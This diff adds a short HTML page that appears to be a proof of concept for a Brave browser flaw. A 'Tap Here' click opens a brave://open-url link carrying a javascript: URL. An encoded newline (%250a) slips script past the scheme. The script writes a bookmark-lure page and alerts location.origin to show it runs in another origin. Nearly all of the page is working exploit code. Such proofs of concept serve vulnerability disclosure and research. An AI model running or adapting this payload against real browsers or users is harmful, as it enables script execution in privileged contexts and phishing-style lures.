@@ -1,0 +1,16 @@
+<h1 style=font-size:88px;color:red onclick=x()><center><br>Tap Here</h1>
+<style>*{background-color:black}</style>
+<script>
+var v='';
+
+function x(){
+v=window.open(`
+
+brave://open-url?url=javascript://google.com/s%250adocument.write("<meta name='viewport' content='width=device-width, initial-scale=1.0'><h1 style=font-size:30px><center><br><br><br>Add me to your Favorites or Bookmarks");alert(location.origin)
+
+`);
+
+}
+
+
+</script>
